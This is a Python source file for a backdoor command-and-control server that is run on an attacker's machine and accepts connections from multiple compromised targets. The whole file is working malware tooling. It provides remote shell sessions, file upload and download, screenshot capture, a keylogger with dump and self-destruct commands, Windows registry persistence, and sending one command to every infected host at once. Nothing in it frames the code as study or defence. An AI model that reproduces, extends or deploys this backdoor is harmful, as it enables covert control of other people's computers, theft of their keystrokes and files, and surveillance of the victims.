# -*- Coding : utf-8 -*-

"""
    Backdoor server  to execute on attacker machine.
    Accept connection from multiple target machines.
"""

import os
import socket
import threading

import termcolor

def help():
    help = """
    >> # Backdoor
    quit                : Disconnect and quit active session
    background          : Quit active session without disconnecting
    clear               : Clear the screen
    cd <directory>      : Changes directory on target machine
    upload <filename>   : Upload file to target machine
    download <filename> : Download file to target machine
    screenshot          : Take a screenshot of target machine
    keylog start        : Start keylogger
    keylog dump         : Print keystokes that target inputted
    keylog stop         : Stop and self destruct keylogger file
    start <program>     : Start program on target machine
    persistence         : Create persistence in Registry
    
    >> # Control center
    clear               : Clear the screen
    targets             : Show connected targets list
    session <session_id>: Connect to the specified session id
    kill <session_id>   : Disconnect from specified session id
    sendall <command>   : Send the same command to all targets
    exit                : Close and exit program
    """
    return help

def upload_file(target, filename):
    with open(filename, "rb") as file:
        target.send(file.read())

def download_file(target, filename):
    with open(filename, "wb") as file:
        chunk = target.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout:
                break

def reliable_recv(target):
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode()
        except Exception as e:
            print(e)
        return data

def reliable_send(target, data):
    try:
        target.send(data.encode())
    except Exception as e:
        print(e)

def target_connection(target, ip):
    count = 0
    while True:
        command = input(f"Shell@({termcolor.colored(ip[0],'cyan')}):~$ ")
        reliable_send(target, command)

        if command == "quit":
            break
        elif command == "background":
            break

        elif command == "help":
            print(help())

        elif command == "clear":
            os.system("clear")

        elif command[:6] == "upload":
            upload_file(target, command[7:])

        elif command[:8] == "download":
            download_file(target, command[9:])

        elif command[:10] == "screenshot":
            with open(f"screenshot_{ip[0]}_{count}.png", "wb") as file:
                target.settimeout(3)
                chunk = target.recv(1024)
                while chunk:
                    file.write(chunk)
                    try:
                        chunk = target.recv(1024)
                    except socket.timeout:
                        break
                target.settimeout(None)
            count += 1
        else:
            response = reliable_recv(target)
            print(response)

    #sock.close()

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(f"\n[+] Target connected from {ip} \n>>> ")
        except:
            pass


host = "0.0.0.0" # To accept connection from all interfaces
port = 65319

targets = []
ips = []
stop_flag = False

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))
sock.listen(5)

t = threading.Thread(target=accept_connections)
t.start()

print("[*] Listening for incoming connections ...")

# Backdoor Control Center
try:
    while True:
        command = input("\n-# Backdoor Control Center #- \n>>> ")

        if command == "targets":
            for id, ip in enumerate(ips):
                print(f"Session {id} -> {ip}")

        elif command == "clear":
            os.system("clear")

        elif command == "help":
            print(help())

        elif command[:7] == "session":
            try:
                id = int(command[8:])
                target_id = targets[id]
                target_ip = ips[id]
                target_connection(target_id, target_ip)
            except:
                print(f"[!!] No session under ID {id}")

        elif command == "exit":
            for target in targets:
                reliable_send(target, "quit")
                target.close()
            sock.close()
            stop_flag = True
            t.join()
            break

        elif command[:4] == "kill":
            target = targets[int(command[5:])]
            ip = ips[int(command[5:])]
            reliable_send(target, "quit")
            target.close()
            targets.remove(target)
            ips.remove(ip)

        elif command[:7] == "sendall":
            print(f"Processing to send command to {len(targets)} targets.")
            try:
                for i, targ in enumerate(targets):
                    print(f"    Sending command to {ips[i]}")
                    reliable_send(targ, command)

            except Exception as e:
                print(f"Failed \n{e}")
        else:
            print("[!!] Command doesn't exist")
except KeyboardInterrupt:
    pass

print("[+] Exit success.")